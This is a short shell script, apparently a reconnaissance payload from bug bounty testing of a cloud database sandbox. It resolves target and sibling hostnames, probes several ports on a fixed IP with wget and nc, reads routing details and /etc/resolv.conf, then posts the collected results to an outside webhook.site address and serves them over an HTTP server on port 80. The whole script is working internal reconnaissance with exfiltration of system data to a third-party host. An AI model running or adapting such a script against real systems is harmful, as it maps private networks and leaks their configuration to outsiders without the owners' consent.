#!/bin/sh
out=/tmp/out.txt; : > $out
echo "==falcon-dns==" >> $out; getent hosts falcon-bug-bounty-flag-pgsql-dev-sandbox.e.aivencloud.com >> $out 2>&1
echo "==falcon-ports==" >> $out
for p in 12691 12692 5432 22 443 80 17429; do
  (timeout 5 wget -q -O- "http://193.122.235.156:$p/" >/dev/null 2>&1 && echo "http:$p OPEN" >> $out) 2>/dev/null
  (timeout 4 nc -z 193.122.235.156 $p 2>/dev/null && echo "tcp:$p OPEN" >> $out) 2>/dev/null
done
echo "==sibling-services==" >> $out
for h in bbh-fresh12-bugcrowdninja-cb9b.k.aivencloud.com bbh-dataapi-bugcrowdninja-cb9b.a.aivencloud.com; do
  echo -n "$h: " >> $out; getent hosts $h >> $out 2>&1
done
echo "==my-ip==" >> $out; ip route 2>/dev/null | head -3 >> $out; cat /etc/resolv.conf >> $out 2>&1
echo DONE >> $out
wget -q -O- --post-file=$out "https://webhook.site/1a315c42-31b4-4eab-bb1a-5860736bdeb8/falcon"
mkdir -p /www; cp $out /www/out.txt; httpd -f -p 80 -h /www
